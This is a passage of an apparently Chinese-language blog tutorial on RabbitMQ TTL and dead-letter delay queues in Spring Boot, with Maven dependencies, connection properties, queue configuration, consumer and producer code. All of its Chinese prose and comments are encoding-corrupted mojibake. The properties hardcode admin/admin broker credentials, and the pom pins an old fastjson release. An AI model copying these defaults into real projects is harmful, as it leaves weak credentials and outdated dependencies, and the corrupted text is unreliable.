class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.73<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.amqp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-rabbit-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>é…ç½®æ–‡ä»¶</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.rabbitmq.host</span>=<span class="hljs-string">192.168.23.132</span><br><span class="hljs-attr">spring.rabbitmq.port</span>=<span class="hljs-string">5672</span><br><span class="hljs-attr">spring.rabbitmq.username</span>=<span class="hljs-string">admin</span><br><span class="hljs-attr">spring.rabbitmq.password</span>=<span class="hljs-string">admin</span><br></code></pre></td></tr></table></figure></li><li><p>æ·»åŠ Swaggeré…ç½®ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> springfox.documentation.builders.ApiInfoBuilder;<br><span class="hljs-keyword">import</span> springfox.documentation.service.ApiInfo;<br><span class="hljs-keyword">import</span> springfox.documentation.service.Contact;<br><span class="hljs-keyword">import</span> springfox.documentation.spi.DocumentationType;<br><span class="hljs-keyword">import</span> springfox.documentation.spring.web.plugins.Docket;<br><span class="hljs-keyword">import</span> springfox.documentation.swagger2.annotations.EnableSwagger2;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ·»åŠ Swaggeré…ç½®ç±»</span><br><span class="hljs-comment"> * [io.xtwoy.config]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 21:47]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableSwagger2</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SwaggerConfig</span> &#123;<br> <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Docket <span class="hljs-title function_">webApiConfig</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Docket</span>(DocumentationType.SWAGGER_2)<br>                .groupName(<span class="hljs-string">&quot;webApi&quot;</span>)<br>                .apiInfo(webApiInfo())<br>                .select()<br>                .build();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> ApiInfo <span class="hljs-title function_">webApiInfo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiInfoBuilder</span>()<br>                .title(<span class="hljs-string">&quot;rabbitmqæ¥å£æ–‡æ¡£&quot;</span>)<br>                .description(<span class="hljs-string">&quot;æœ¬æ–‡æ¡£æè¿°äº†rabbitmqå¾®æœåŠ¡æ¥å£å®šä¹‰&quot;</span>)<br>                .version(<span class="hljs-string">&quot;1.0&quot;</span>)<br>                .contact(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Contact</span>(<span class="hljs-string">&quot;enjoy6288&quot;</span>,<span class="hljs-string">&quot;http://atguigu.com&quot;</span>,<span class="hljs-string">&quot;123456@qq.com&quot;</span>))<br>                .build();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h2 id="82-é˜Ÿåˆ—å®ç°"><a class="markdownIt-Anchor" href="#82-é˜Ÿåˆ—å®ç°"></a> 8.2 é˜Ÿåˆ—å®ç°</h2><blockquote><p>ä»£ç æ¶æ„</p></blockquote><p>åˆ›å»ºä¸¤ä¸ªé˜Ÿåˆ—QAå’ŒQBï¼Œä¸¤è€…é˜Ÿåˆ—TTLåˆ†åˆ«è®¾ç½®ä¸º10Så’Œ40Sï¼Œç„¶ååœ¨åˆ›å»ºä¸€ä¸ªäº¤æ¢æœºXå’Œæ­»ä¿¡äº¤æ¢æœºYï¼Œå®ƒä»¬çš„ç±»å‹éƒ½æ˜¯directï¼Œåˆ›å»ºä¸€ä¸ªæ­»ä¿¡é˜Ÿåˆ—QDï¼Œå®ƒä»¬çš„ç»‘å®šå…³ç³»å¦‚ä¸‹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112215005305.png" alt="image-20230112215005305" /></p><blockquote><p>ä»£ç å®ç°</p></blockquote><ol><li><p>é…ç½®ç±»ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.core.*;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.config]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 21:51]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TtlQueueConfig</span> &#123;<br><br><br>    <span class="hljs-comment">//æ™®é€šäº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span>  <span class="hljs-variable">X_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;X&quot;</span>;<br>    <span class="hljs-comment">//æ­»ä¿¡äº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">Y_DEAD_LETTER_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Y&quot;</span>;<br>    <span class="hljs-comment">//æ™®é€šé˜Ÿåˆ—çš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_A</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QA&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_B</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QB&quot;</span>;<br>    <span class="hljs-comment">//æ­»ä¿¡é˜Ÿåˆ—çš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_LATTER_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QD&quot;</span>;<br><br>    <span class="hljs-comment">//å£°æ˜xExchange</span><br>    <span class="hljs-meta">@Bean(&quot;xExchange&quot;)</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">xExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(X_EXCHANGE);<br>    &#125;<br><br>    <span class="hljs-comment">//å£°æ˜yExchange</span><br>    <span class="hljs-meta">@Bean(&quot;yExchange&quot;)</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">yExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(Y_DEAD_LETTER_EXCHANGE);<br>    &#125;<br><br>    <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span><br>    <span class="hljs-meta">@Bean(&quot;queueA&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueA</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡äº¤æ¢æœº</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡Routing-key</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-comment">//è®¾ç½®TTL å•ä½æ˜¯ms</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">10000</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(QUEUE_A).withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-comment">//å£°æ˜æ™®é€šé˜Ÿåˆ— TTLä¸º40s</span><br>    <span class="hljs-meta">@Bean(&quot;queueB&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueB</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡äº¤æ¢æœº</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡Routing-key</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-comment">//è®¾ç½®TTL å•ä½æ˜¯ms</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">40000</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(QUEUE_B).withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-comment">//æ­»ä¿¡é˜Ÿåˆ—</span><br>    <span class="hljs-meta">@Bean(&quot;queueD&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueD</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(DEAD_LATTER_QUEUE).build();<br>    &#125;<br><br>    <span class="hljs-comment">//ç»‘å®š</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueABindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueA&quot;)</span> Queue queueA,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueA).to(xExchange).with(<span class="hljs-string">&quot;XA&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//ç»‘å®š</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueBBindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueB&quot;)</span> Queue queueB,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueB).to(xExchange).with(<span class="hljs-string">&quot;XB&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//ç»‘å®š</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueDBindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueD&quot;)</span> Queue queueD,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;yExchange&quot;)</span> DirectExchange yExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueD).to(yExchange).with(<span class="hljs-string">&quot;YD&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.consumer;<br><br><span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;<br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ¶ˆè´¹è€…</span><br><span class="hljs-comment"> * [io.xtwoy.consumer]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 21:53]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadLetterQueueConsumer</span> &#123;<br><br>    <span class="hljs-comment">//æ¥æ”¶æ¶ˆæ¯</span><br>    <span class="hljs-meta">@RabbitListener(queues = &quot;QD&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receiveD</span><span class="hljs-params">(Message message, Channel channel)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());<br>        log.info(<span class="hljs-string">&quot;å½“å‰æ—¶é—´ï¼š&#123;&#125;ï¼Œæ”¶åˆ°æ­»ä¿¡é˜Ÿåˆ—çš„æ¶ˆæ¯ï¼š&#123;&#125;&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),msg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ç”Ÿäº§è€…ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* å‘é€å»¶è¿Ÿæ¶ˆæ¯</span><br><span class="hljs-comment">* */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/ttl&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SendMsgController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//å¼€å§‹å‘æ¶ˆæ¯</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMsg/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMsg</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span>&#123;<br>      log.info(<span class="hljs-string">&quot;å½“å‰æ—¶é—´ï¼š&#123;&#125;ï¼Œå‘é€ä¸€æ¡ä¿¡æ¯ç»™ä¸¤ä¸ªTTLé˜Ÿåˆ—ï¼š&#123;&#125;&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),message);<br><br>      rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XA&quot;</span>,<span class="hljs-string">&quot;æ¶ˆæ¯æ¥è‡ªTTLä¸º10sçš„é˜Ÿåˆ—ï¼š&quot;</span> + message);<br>      rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XB&quot;</span>,<span class="hljs-string">&quot;æ¶ˆæ¯æ¥è‡ªTTLä¸º40sçš„é˜Ÿåˆ—ï¼š&quot;</span> + message);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112224824453.png" alt="image-20230112224824453" /></p></li></ol><h2 id="83-é˜Ÿåˆ—ä¼˜åŒ–"><a class="markdownIt-Anchor" href="#83-é˜Ÿåˆ—ä¼˜åŒ–"></a> 8.3 é˜Ÿåˆ—ä¼˜åŒ–</h2><blockquote><p>é—®é¢˜</p></blockquote><p>ç¬¬ä¸€æ¡æ¶ˆæ¯åœ¨10Såå˜æˆäº†æ­»ä¿¡æ¶ˆæ¯ï¼Œç„¶åè¢«æ¶ˆè´¹è€…æ¶ˆè´¹æ‰ï¼Œç¬¬äºŒæ¡æ¶ˆæ¯åœ¨40Sä¹‹åå˜æˆäº†æ­»ä¿¡æ¶ˆæ¯ï¼Œç„¶åè¢«æ¶ˆè´¹æ‰ï¼Œè¿™æ ·ä¸€ä¸ªå»¶æ—¶é˜Ÿåˆ—å°±æ‰“é€ å®Œæˆäº†ã€‚<br />ä¸è¿‡ï¼Œå¦‚æœè¿™æ ·ä½¿ç”¨çš„è¯ï¼Œå²‚ä¸æ˜¯æ¯å¢åŠ ä¸€ä¸ªæ–°çš„æ—¶é—´éœ€æ±‚ï¼Œå°±è¦æ–°å¢ä¸€ä¸ªé˜Ÿåˆ—ï¼Œè¿™é‡Œåªæœ‰10Så’Œ40Sä¸¤ä¸ªæ—¶é—´é€‰é¡¹ï¼Œå¦‚æœéœ€è¦ä¸€ä¸ªå°æ—¶åå¤„ç†ï¼Œé‚£ä¹ˆå°±éœ€è¦å¢åŠ TTLä¸ºä¸€ä¸ªå°æ—¶çš„é˜Ÿåˆ—ï¼Œå¦‚æœæ˜¯é¢„å®šä¼šè®®å®¤ç„¶åæå‰é€šçŸ¥è¿™æ ·çš„åœºæ™¯ï¼Œå²‚ä¸æ˜¯è¦å¢åŠ æ— æ•°ä¸ªé˜Ÿåˆ—æ‰èƒ½æ»¡è¶³éœ€æ±‚ï¼Ÿ</p><blockquote><p>ä»£ç æ¶æ„å›¾</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113095316877.png" alt="image-20230113095316877" 